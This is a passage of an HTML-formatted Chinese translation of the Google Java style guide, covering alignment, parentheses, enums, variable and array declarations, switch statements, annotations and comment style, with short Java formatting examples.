face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22411;&#21644;&#21464;&#37327;&#20043;&#38388;&#65306;</span></font>Listlist<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#25968;&#32452;&#21021;&#22987;&#21270;&#20013;&#65292;&#22823;&#25324;&#21495;&#20869;&#30340;&#31354;&#26684;&#26159;&#21487;&#36873;&#30340;&#65292;&#21363;</span></font>newint[] {5, 6}<font face="&#23435;&#20307;"><span lang="zh-CN">&#21644;</span></font>newint[] { 5, 6 }<font face="&#23435;&#20307;"><span lang="zh-CN">&#37117;&#26159;&#21487;&#20197;&#30340;&#12290;</span></font></p></ol><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Note</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;&#36825;&#20010;&#35268;&#21017;&#24182;&#19981;&#35201;&#27714;&#25110;&#31105;&#27490;&#19968;&#34892;&#30340;&#24320;&#20851;&#25110;&#32467;&#23614;&#38656;&#35201;&#39069;&#22806;&#30340;&#31354;&#26684;&#65292;&#21482;&#23545;&#20869;&#37096;&#31354;&#26684;&#20570;&#35201;&#27714;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc474829803"></a>4.6.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27700;&#24179;&#23545;&#40784;&#65306;&#19981;&#20570;&#35201;&#27714;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26415;&#35821;&#35828;&#26126;&#65306;&#27700;&#24179;&#23545;&#40784;&#25351;&#30340;&#26159;&#36890;&#36807;&#22686;&#21152;&#21487;&#21464;&#25968;&#37327;&#30340;&#31354;&#26684;&#26469;&#20351;&#26576;&#19968;&#34892;&#30340;&#23383;&#31526;&#19982;&#19978;&#19968;&#34892;&#30340;&#30456;&#24212;&#23383;&#31526;&#23545;&#40784;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#26159;&#20801;&#35768;&#30340;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32780;&#19988;&#22312;&#19981;&#23569;&#22320;&#26041;&#21487;&#20197;&#30475;&#21040;&#36825;&#26679;&#30340;&#20195;&#30721;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20294;</span></font></font><font size="3" style="font-size: 12pt">Google</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32534;&#31243;&#39118;&#26684;&#23545;&#27492;&#19981;&#20570;&#35201;&#27714;&#12290;&#21363;&#20351;&#23545;&#20110;&#24050;&#32463;&#20351;&#29992;&#27700;&#24179;&#23545;&#40784;&#30340;&#20195;&#30721;&#65292;&#25105;&#20204;&#20063;&#19981;&#38656;&#35201;&#21435;&#20445;&#25345;&#36825;&#31181;&#39118;&#26684;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20197;&#19979;&#31034;&#20363;&#20808;&#23637;&#31034;&#26410;&#23545;&#40784;&#30340;&#20195;&#30721;&#65292;&#28982;&#21518;&#26159;&#23545;&#40784;&#30340;&#20195;&#30721;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">private<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">x; </font></font>// this is fineprivate<font face="Courier New, serif"><font size="2" style="font-size: 10pt">Color color; </font></font>// this too</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">private<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">   x;         </font></font>// permitted, but future editsprivate<font face="Courier New, serif"><font size="2" style="font-size: 10pt">Color  color;     </font></font>// may leave it unaligned</font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;&#23545;&#40784;&#21487;&#22686;&#21152;&#20195;&#30721;&#21487;&#35835;&#24615;&#65292;&#20294;&#23427;&#20026;&#26085;&#21518;&#30340;&#32500;&#25252;&#24102;&#26469;&#38382;&#39064;&#12290;&#32771;&#34385;&#26410;&#26469;&#26576;&#20010;&#26102;&#20505;&#65292;&#25105;&#20204;&#38656;&#35201;&#20462;&#25913;&#19968;&#22534;&#23545;&#40784;&#30340;&#20195;&#30721;&#20013;&#30340;&#19968;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#21487;&#33021;&#23548;&#33268;&#21407;&#26412;&#24456;&#28418;&#20142;&#30340;&#23545;&#40784;&#20195;&#30721;&#21464;&#24471;&#38169;&#20301;&#12290;&#24456;&#21487;&#33021;&#23427;&#20250;&#25552;&#31034;&#20320;&#35843;&#25972;&#21608;&#22260;&#20195;&#30721;&#30340;&#31354;&#30333;&#26469;&#20351;&#36825;&#19968;&#22534;&#20195;&#30721;&#37325;&#26032;&#27700;&#24179;&#23545;&#40784;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">(</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27604;&#22914;&#31243;&#24207;&#21592;&#24819;&#20445;&#25345;&#36825;&#31181;&#27700;&#24179;&#23545;&#40784;&#30340;&#39118;&#26684;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">)</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#23601;&#20250;&#35753;&#20320;&#20570;&#35768;&#22810;&#30340;&#26080;&#29992;&#21151;&#65292;&#22686;&#21152;&#20102;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">reviewer</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#24037;&#20316;&#24182;&#19988;&#21487;&#33021;&#23548;&#33268;&#26356;&#22810;&#30340;&#21512;&#24182;&#20914;&#31361;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1872255370"></a>4.7 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29992;&#23567;&#25324;&#21495;&#26469;&#38480;&#23450;&#32452;&#65306;&#25512;&#33616;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38500;&#38750;&#20316;&#32773;&#21644;</span></font></font><font size="3" style="font-size: 12pt">reviewer</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#37117;&#35748;&#20026;&#21435;&#25481;&#23567;&#25324;&#21495;&#20063;&#19981;&#20250;&#20351;&#20195;&#30721;&#34987;&#35823;&#35299;&#65292;&#25110;&#26159;&#21435;&#25481;&#23567;&#25324;&#21495;&#33021;&#35753;&#20195;&#30721;&#26356;&#26131;&#20110;&#38405;&#35835;&#65292;&#21542;&#21017;&#25105;&#20204;&#19981;&#24212;&#35813;&#21435;&#25481;&#23567;&#25324;&#21495;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25105;&#20204;&#27809;&#26377;&#29702;&#30001;&#20551;&#35774;&#35835;&#32773;&#33021;&#35760;&#20303;&#25972;&#20010;</span></font></font><font size="3" style="font-size: 12pt">Java</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36816;&#31639;&#31526;&#20248;&#20808;&#32423;&#34920;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc2001949432"></a>4.8 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20855;&#20307;&#32467;&#26500;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc2078751231"></a>4.8.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26522;&#20030;&#31867;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26522;&#20030;&#24120;&#37327;&#38388;&#29992;&#36887;&#21495;&#38548;&#24320;&#65292;&#25442;&#34892;&#21487;&#36873;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27809;&#26377;&#26041;&#27861;&#21644;&#25991;&#26723;&#30340;&#26522;&#20030;&#31867;&#21487;&#20889;&#25104;&#25968;&#32452;&#21021;&#22987;&#21270;&#30340;&#26684;&#24335;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">private<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>enum<font face="Courier New, serif"><font size="2" style="font-size: 10pt">Suit { _x000D_    CLUBS, _x000D_    HEARTS, _x000D_    SPADES,_x000D_    DIAMONDS_x000D_}</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30001;&#20110;&#26522;&#20030;&#31867;&#20063;&#26159;&#19968;&#20010;&#31867;&#65292;&#22240;&#27492;&#25152;&#26377;&#36866;&#29992;&#20110;&#20854;&#23427;&#31867;&#30340;&#26684;&#24335;&#35268;&#21017;&#20063;&#36866;&#29992;&#20110;&#26522;&#20030;&#31867;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc766392792"></a>4.8.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21464;&#37327;&#22768;&#26126;</span></font></h3><h4 class="western" style="widows: 2; orphans: 2">4.8.2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27599;&#27425;&#21482;&#22768;&#26126;&#19968;&#20010;&#21464;&#37327;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19981;&#35201;&#20351;&#29992;&#32452;&#21512;&#22768;&#26126;&#65292;&#27604;&#22914;</span></font></font><font size="3" style="font-size: 12pt">inta, b;</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h4 class="western" style="widows: 2; orphans: 2">4.8.2.2<font face="&#23435;&#20307;"><span lang="zh-CN">&#38656;&#35201;&#26102;&#25165;&#22768;&#26126;&#65292;&#24182;&#23613;&#24555;&#36827;&#34892;&#21021;&#22987;&#21270;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19981;&#35201;&#22312;&#19968;&#20010;&#20195;&#30721;&#22359;&#30340;&#24320;&#22836;&#25226;&#23616;&#37096;&#21464;&#37327;&#19968;&#27425;&#24615;&#37117;&#22768;&#26126;&#20102;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#26159;</span></font></font><font size="3" style="font-size: 12pt">c</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#35328;&#30340;&#20570;&#27861;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#32780;&#26159;&#22312;&#31532;&#19968;&#27425;&#38656;&#35201;&#20351;&#29992;&#23427;&#26102;&#25165;&#22768;&#26126;&#12290;&#23616;&#37096;&#21464;&#37327;&#22312;&#22768;&#26126;&#26102;&#26368;&#22909;&#23601;&#36827;&#34892;&#21021;&#22987;&#21270;&#65292;&#25110;&#32773;&#22768;&#26126;&#21518;&#23613;&#24555;&#36827;&#34892;&#21021;&#22987;&#21270;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc2132537971"></a>4.8.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25968;&#32452;</span></font></h3><h4 class="western" style="widows: 2; orphans: 2">4.8.3.1<font face="&#23435;&#20307;"><span lang="zh-CN">&#25968;&#32452;&#21021;&#22987;&#21270;&#65306;&#21487;&#20889;&#25104;&#22359;&#29366;&#32467;&#26500;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25968;&#32452;&#21021;&#22987;&#21270;&#21487;&#20197;&#20889;&#25104;&#22359;&#29366;&#32467;&#26500;&#65292;&#27604;&#22914;&#65292;&#19979;&#38754;&#30340;&#20889;&#27861;&#37117;&#26159;</span></font></font><font size="3" style="font-size: 12pt">OK</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">new<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">[]{_x000D_        </font></font>0<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>1<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>2<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>3<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_}</font></font>new<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">[]{_x000D_        </font></font>0<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,_x000D_       </font></font>1<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,_x000D_       </font></font>2<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,_x000D_       </font></font>3<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_}</font></font>new<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">[]{_x000D_        </font></font>0<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>1<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,_x000D_       </font></font>2<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>3<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_}</font></font>new<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">[]_x000D_       {</font></font>0<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>1<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>2<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>3<font face="Courier New, serif"><font size="2" style="font-size: 10pt">}</font></font></font></font></p><h4 class="western" style="widows: 2; orphans: 2">4.8.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;</span></font>C<font face="&#23435;&#20307;"><span lang="zh-CN">&#39118;&#26684;&#30340;&#25968;&#32452;&#22768;&#26126;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20013;&#25324;&#21495;&#26159;&#31867;&#22411;&#30340;&#19968;&#37096;&#20998;&#65306;</span></font></font><font size="3" style="font-size: 12pt">String[]args</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#32780;&#38750; </span></font></font><font size="3" style="font-size: 12pt">Stringargs[]</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc647386592"></a>4.8.4 switch<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26415;&#35821;&#35828;&#26126;&#65306;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#30340;&#22823;&#25324;&#21495;&#20869;&#26159;&#19968;&#20010;&#25110;&#22810;&#20010;&#35821;&#21477;&#32452;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;&#35821;&#21477;&#32452;&#21253;&#21547;&#19968;&#20010;&#25110;&#22810;&#20010;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#31614;</span></font></font><font size="3" style="font-size: 12pt">(caseFOO:</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">default:)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21518;&#38754;&#36319;&#30528;&#19968;&#26465;&#25110;&#22810;&#26465;&#35821;&#21477;&#12290;</span></font></font></p><h4 class="western" style="widows: 2; orphans: 2">4.8.4.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#32553;&#36827;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19982;&#20854;&#23427;&#22359;&#29366;&#32467;&#26500;&#19968;&#33268;&#65292;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#20013;&#30340;&#20869;&#23481;&#32553;&#36827;&#20026;</span></font></font><font size="3" style="font-size: 12pt">2</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;&#12290;&#27599;&#20010;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#31614;&#21518;&#26032;&#36215;&#19968;&#34892;&#65292;&#20877;&#32553;&#36827;</span></font></font><font size="3" style="font-size: 12pt">2</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;&#65292;&#20889;&#19979;&#19968;&#26465;&#25110;&#22810;&#26465;&#35821;&#21477;&#12290;</span></font></font></p><h4 class="western" style="widows: 2; orphans: 2">4.8.4.2Fall-through<font face="&#23435;&#20307;"><span lang="zh-CN">&#65306;&#27880;&#37322;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22312;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#20869;&#65292;&#27599;&#20010;&#35821;&#21477;&#32452;&#35201;&#20040;&#36890;&#36807;</span></font></font><font size="3" style="font-size: 12pt">break,continue, return</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;&#25243;&#20986;&#24322;&#24120;&#26469;&#32456;&#27490;&#65292;&#35201;&#20040;&#36890;&#36807;&#19968;&#26465;&#27880;&#37322;&#26469;&#35828;&#26126;&#31243;&#24207;&#23558;&#32487;&#32493;&#25191;&#34892;&#21040;&#19979;&#19968;&#20010;&#35821;&#21477;&#32452;&#65292;&#20219;&#20309;&#33021;&#34920;&#36798;&#36825;&#20010;&#24847;&#24605;&#30340;&#27880;&#37322;&#37117;&#26159;</span></font></font><font size="3" style="font-size: 12pt">OK</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20856;&#22411;&#30340;&#26159;&#29992;</span></font></font><font size="3" style="font-size: 12pt">//fall through)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#36825;&#20010;&#29305;&#27530;&#30340;&#27880;&#37322;&#24182;&#19981;&#38656;&#35201;&#22312;&#26368;&#21518;&#19968;&#20010;&#35821;&#21477;&#32452;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#33324;&#26159;</span></font></font><font size="3" style="font-size: 12pt">default)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20013;&#20986;&#29616;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31034;&#20363;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">switch<font face="Courier New, serif"><font size="2" style="font-size: 10pt">(input) {_x000D_    </font></font>case<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>1<font face="Courier New, serif"><font size="2" style="font-size: 10pt">:_x000D_   </font></font>case<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>2<font face="Courier New, serif"><font size="2" style="font-size: 10pt">:_x000D_       prepareOneOrTwo();        </font></font>// fall through<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_   </font></font>case<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>3<font face="Courier New, serif"><font size="2" style="font-size: 10pt">:_x000D_       handleOneTwoOrThree();_x000D_        </font></font>break<font face="Courier New, serif"><font size="2" style="font-size: 10pt">;_x000D_   </font></font>default<font face="Courier New, serif"><font size="2" style="font-size: 10pt">:_x000D_       handleLargeNumber(input);_x000D_}</font></font></font></font></p><h4 class="western" style="widows: 2; orphans: 2">4.8.4.3default<font face="&#23435;&#20307;"><span lang="zh-CN">&#30340;&#24773;&#20917;&#35201;&#20889;&#20986;&#26469;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;</span></font></font><font size="3" style="font-size: 12pt">switch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#37117;&#21253;&#21547;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt">default</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#32452;&#65292;&#21363;&#20351;&#23427;&#20160;&#20040;&#20195;&#30721;&#20063;&#19981;&#21253;&#21547;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1154230910"></a>4.8.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27880;&#35299;</span></font>(Annotations)</h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#35299;&#32039;&#36319;&#22312;&#25991;&#26723;&#22359;&#21518;&#38754;&#65292;&#24212;&#29992;&#20110;&#31867;&#12289;&#26041;&#27861;&#21644;&#26500;&#36896;&#20989;&#25968;&#65292;&#19968;&#20010;&#27880;&#35299;&#29420;&#21344;&#19968;&#34892;&#12290;&#36825;&#20123;&#25442;&#34892;&#19981;&#23646;&#20110;&#33258;&#21160;&#25442;&#34892;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31532;</span></font></font><font size="3" style="font-size: 12pt">4.5</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;&#65292;&#33258;&#21160;&#25442;&#34892;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#22240;&#27492;&#32553;&#36827;&#32423;&#21035;&#19981;&#21464;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br>@Nullablepublic String getNameIfPresent() { ...}<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22806;&#65306;&#21333;&#20010;&#30340;&#27880;&#35299;&#21487;&#20197;&#21644;&#31614;&#21517;&#30340;&#31532;&#19968;&#34892;&#20986;&#29616;&#22312;&#21516;&#19968;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br>@Overridepublic int hashCode() { ...}</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24212;&#29992;&#20110;&#23383;&#27573;&#30340;&#27880;&#35299;&#32039;&#38543;&#25991;&#26723;&#22359;&#20986;&#29616;&#65292;&#24212;&#29992;&#20110;&#23383;&#27573;&#30340;&#22810;&#20010;&#27880;&#35299;&#20801;&#35768;&#19982;&#23383;&#27573;&#20986;&#29616;&#22312;&#21516;&#19968;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br>@Partial@Mock DataLoader loader;<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21442;&#25968;&#21644;&#23616;&#37096;&#21464;&#37327;&#27880;&#35299;&#27809;&#26377;&#29305;&#23450;&#35268;&#21017;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc870349156"></a>4.8.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27880;&#37322;</span></font></h3><h4 class="western" style="widows: 2; orphans: 2">4.8.6.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22359;&#27880;&#37322;&#39118;&#26684;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#27880;&#37322;&#19982;&#20854;&#21608;&#22260;&#30340;&#20195;&#30721;&#22312;&#21516;&#19968;&#32553;&#36827;&#32423;&#21035;&#12290;&#23427;&#20204;&#21487;&#20197;&#26159;</span></font></font><font size="3" style="font-size: 12pt">/<em>... </em>/</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#65292;&#20063;&#21487;&#20197;&#26159;</span></font></font><font size="3" style="font-size: 12pt">//...</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#12290;&#23545;&#20110;&#22810;&#34892;&#30340;</span></font></font><font size="3" style="font-size: 12pt">/<em>... </em>/</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span 